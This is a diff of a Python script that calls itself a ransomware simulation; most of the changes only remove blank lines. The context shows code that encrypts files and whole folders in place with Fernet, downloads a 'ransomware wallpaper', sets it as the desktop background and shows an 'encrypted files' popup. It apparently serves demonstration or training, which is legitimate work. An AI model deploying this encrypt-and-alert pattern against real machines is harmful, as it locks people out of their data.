@@ -15,17 +15,14 @@ from tkinter import messagebox
 def generate_key():
     return Fernet.generate_key()
 
-
 # Loads key from file and returns it
 def load_key(key_path):
     return open(key_path, "rb").read()
-
 
 # Writes key to specified path
 def write_key(key, key_path):
     with open(key_path, "wb") as key_file:
         key_file.write(key)
-
 
 # Ecnrypts file
 def encrypt_file(filepath, key):
@@ -40,7 +37,6 @@ def encrypt_file(filepath, key):
     with open(filepath, "wb") as file:
         file.write(encrypted_data)
 
-
 # Decrypts file
 def decrypt_file(filepath, key):
     
@@ -54,7 +50,6 @@ def decrypt_file(filepath, key):
     with open(filepath, "wb") as file:
         file.write(decrypted_data)
 
-
 # Encrypts message/string
 def encrypt_message(message, key):
 
@@ -62,7 +57,6 @@ def encrypt_message(message, key):
 
     encrypted_message = fernet.encrypt(message.encode('utf-8'))
     return encrypted_message
-
 
 # Decrypts message/string
 def decrypt_message(encrypted_message, key):
@@ -72,7 +66,6 @@ def decrypt_message(encrypted_message, key):
     decrypted_message = fernet.decrypt(encrypted_message.encode('utf-8'))
     return decrypted_message.decode()
 
-
 # Defines the path where the key used to encrypt file/string will be saved
 def key_file(filepath):
     dir_name, base_name = os.path.split(filepath)
@@ -80,18 +73,15 @@ def key_file(filepath):
     key_filepath = os.path.join(dir_name, key_filename)
     return key_filepath
 
-
 # Defines the path to save the encrypted message/string
 def message_path(filepath):
     message_path = os.path.join(filepath, "encryptedmessage.txt")
     return message_path
 
-
 # Writes the encrypted message/string to that file
 def write_message(message, message_path):
     with open(message_path, "wb") as message_file:
         message_file.write(message)
-
 
 # Encrypts folder
 def encrypt_folder(folder_path, message_path):
@@ -100,7 +90,6 @@ def encrypt_folder(folder_path, message_path):
             file_path = os.path.join(root, file)
             encrypt_file(file_path, key)
 
-
 # Decrypts folder
 def decrypt_folder(folder_path, key):
     for root, dirs, files in os.walk(folder_path):
@@ -108,12 +97,10 @@ def decrypt_folder(folder_path, key):
             file_path = os.path.join(root, file)
             decrypt_file(file_path, key)
     
-
 # Creates the path for the key used to encrypt a folder
 def folderkey_path(filepath):
     message_path = os.path.join(filepath, "folderkey.txt")
     return message_path
-
 
 # Download ransomware wallpaper
 def download_image(url, local_path):
@@ -124,7 +111,6 @@ def download_image(url, local_path):
     else:
         raise Exception(f"Failed to download image from {url}")
 
-
 # Creates pop-up with a message for the user
 def show_popup():
     message = "Your files have been encrypted! To decrypt your files, follow the instructions in the README file."  # Predefined ransomware message
@@ -132,7 +118,6 @@ def show_popup():
     root = tk.Tk()
     root.withdraw()  # Hide the main window
     messagebox.showerror("Ransomware Simulation", message)
-
 
 # Sets the wallpaper for the ransomware simulation
 def set_wallpaper():
@@ -144,7 +129,7 @@ def set_wallpaper():
     # Change the desktop wallpaper to the specified image and make it permanent
     ctypes.windll.user32.SystemParametersInfoW(20, 0, local_path, 3)
 
-   
+
 # Print the menu
 mode = input("""To encrypt a file, enter 1.
 To decrypt a file, enter 2. 
@@ -167,7 +152,6 @@ if mode == "1":
     print(f"\nThe file '{filepath}' has been encrypted and overwritten.\n")
     print(f"The key has been saved to '{key_filepath}'\n")
     
-
 elif mode == "2":
 
     filepath = input("Provide a path to the file:")
@@ -178,7 +162,6 @@ elif mode == "2":
 
     print(f"\nThe file '{filepath}' has been decrypted and overwritten\n")
     
-
 elif mode == "3":
     
     message = input("Provide the cleartext string: ")
@@ -200,7 +183,6 @@ elif mode == "3":
     print(f"The encrypted string has been saved to: {dir_message}\n")
     print(f"The key has been saved to: {key_filepath}\n")
 
-
 elif mode == "4":
 
     encrypted_message = input("Provide the ciphertext string: ")
@@ -209,7 +191,6 @@ elif mode == "4":
     decrypted_message = decrypt_message(encrypted_message, key)
 
     print(f"\nDecrypted message: {decrypted_message}\n")
-    
 
 elif mode == "5":
 
@@ -230,7 +211,6 @@ elif mode == "5":
         print(f"\nThe folder '{folder_path}' and its contents have been encrypted.\n")
         print(f"The key has been saved to '{key_filepath}'\n")
 
-
 elif mode == "6":
     folder_path = input("Provide the path to the folder: ")
     key_filepath = input("Provide the path to the key file: ")
@@ -245,14 +225,12 @@ elif mode == "6":
 
         print(f"\nThe folder '{folder_path}' and its contents have been decrypted.\n")
 
-
 elif mode == "7":
 
     set_wallpaper()
     show_popup()
 
     print("\nRansomware simulation complete!\n")
-
 
 else:
     print("\nWrong input! Please try again.\n")
